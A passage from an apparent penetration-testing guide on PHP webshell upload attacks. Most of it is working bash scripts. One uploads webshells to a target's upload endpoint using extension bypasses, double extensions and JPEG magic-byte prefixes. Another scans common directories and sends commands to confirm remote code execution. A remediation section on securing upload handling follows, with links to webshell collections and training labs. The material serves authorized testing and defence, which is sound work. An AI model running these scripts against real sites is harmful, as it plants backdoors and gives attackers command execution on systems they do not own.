      "shells/standard/071_pre_system.php"
      "shells/standard/078_dual_os.php"
  )

  # Upload with every extension bypass
  for shell in "${PRIORITY_SHELLS[@]}"; do
      [ -f "$shell" ] || continue
      BASENAME=$(basename "$shell" .php)

      for ext in php phtml php5 php7 pht phar phps pgif inc PHP pHp Php; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${shell};filename=${BASENAME}.${ext};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] ${BASENAME}.${ext} ACCEPTED"
      done

      # Double extensions
      for combo in php.jpg jpg.php php.png php.txt; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@${shell};filename=${BASENAME}.${combo};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] ${BASENAME}.${combo} ACCEPTED"
      done

      # Magic bytes + shell
      printf '\xFF\xD8\xFF\xE0' > /tmp/magic_shell
      cat "$shell" >> /tmp/magic_shell
      for ext in phtml php5 pht phar; do
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 15 \
            -X POST "$UPLOAD_URL" \
            -F "${FIELD}=@/tmp/magic_shell;filename=${BASENAME}.${ext};type=image/jpeg" \
            -H "Cookie: $COOKIE" 2>/dev/null)
          [ "$STATUS" = "200" ] && echo "[+] JPEG magic + ${BASENAME}.${ext} ACCEPTED"
      done
  done

  rm -f /tmp/magic_shell
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Verify Deployed Shells"}
  ```bash
  TARGET="https://target.com"

  echo "═══ Shell Verification ═══"

  DIRS=(uploads files media images static content assets data tmp)
  SHELLS=(
      "001_15b_backtick_get" "037_system_get" "071_pre_system" "078_dual_os"
  )
  EXTS=(php phtml php5 pht phar)
  PARAMS=("c=echo+SHELL_VERIFIED" "cmd=echo+SHELL_VERIFIED" "0=echo+SHELL_VERIFIED")

  for dir in "${DIRS[@]}"; do
      for shell in "${SHELLS[@]}"; do
          for ext in "${EXTS[@]}"; do
              for param in "${PARAMS[@]}"; do
                  URL="${TARGET}/${dir}/${shell}.${ext}"
                  RESULT=$(curl -s --max-time 3 "${URL}?${param}" 2>/dev/null)
                  if echo "$RESULT" | grep -q "SHELL_VERIFIED"; then
                      echo "[!!!] RCE: ${URL}?${param}"
                  fi
              done
          done
      done
  done
  ```
  :::
::

---

## Reporting & Remediation

::card-group
  :::card
  ---
  icon: i-lucide-shield-check
  title: Whitelist Extensions
  ---
  Only allow `.jpg`, `.png`, `.gif`, `.pdf`. Case-insensitive comparison. Never blacklist.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Random Filenames
  ---
  `bin2hex(random_bytes(16)) . '.jpg'` — eliminates ALL extension attacks.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Disable PHP in Uploads
  ---
  `php_flag engine off` in `.htaccess` or Apache config for upload directory.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Re-encode Images
  ---
  Process through GD/Imagick. Save clean copy. Strips ALL embedded PHP.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Store Outside Web Root
  ---
  `/var/uploads/` not under web root. Serve via proxy with `Content-Disposition: attachment`.
  :::

  :::card
  ---
  icon: i-lucide-shield-check
  title: Block Config Files
  ---
  Reject `.htaccess`, `.user.ini`, `web.config`. Set `AllowOverride None`.
  :::
::

---

## References

::card-group
  :::card
  ---
  icon: i-lucide-external-link
  title: PayloadsAllTheThings — Webshells
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
  target: _blank
  ---
  Community webshell and upload bypass collection.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: p0wny-shell
  to: https://github.com/flozz/p0wny-shell
  target: _blank
  ---
  Minimal interactive PHP webshell with terminal UI.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: tennc/webshell
  to: https://github.com/tennc/webshell
  target: _blank
  ---
  Massive curated webshell collection (PHP, JSP, ASP, ASPX).
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: Weevely3
  to: https://github.com/epinna/weevely3
  target: _blank
  ---
  Steganographic PHP backdoor with encrypted communications.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: dfunc-bypasser
  to: https://github.com/teambi0s/dfunc-bypasser
  target: _blank
  ---
  Automated `disable_functions` bypass discovery.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: OWASP — File Upload
  to: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
  target: _blank
  ---
  OWASP file upload vulnerability reference.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: PortSwigger — Upload Labs
  to: https://portswigger.net/web-security/file-upload
  target: _blank
  ---
  Interactive file upload exploitation labs.
  :::

  :::card
  ---
  icon: i-lucide-external-link
  title: HackTricks — PHP Tricks
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/
  target: _blank
  ---
  PHP exploitation including disable_functions, type juggling, deserialization.
  :::
::